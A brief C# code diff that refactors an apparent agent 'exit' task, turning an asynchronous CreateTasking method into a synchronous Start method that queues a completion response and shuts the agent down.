@@ -21,13 +21,11 @@ namespace Tasks
         {
         }
 
-        public override System.Threading.Tasks.Task CreateTasking()
+
+        public override void Start()
         {
-            return new System.Threading.Tasks.Task(() =>
-            {
-                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", true));
-                _agent.Exit();
-            }, _cancellationToken.Token);
+            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", true));
+            _agent.Exit();
         }
     }
 }
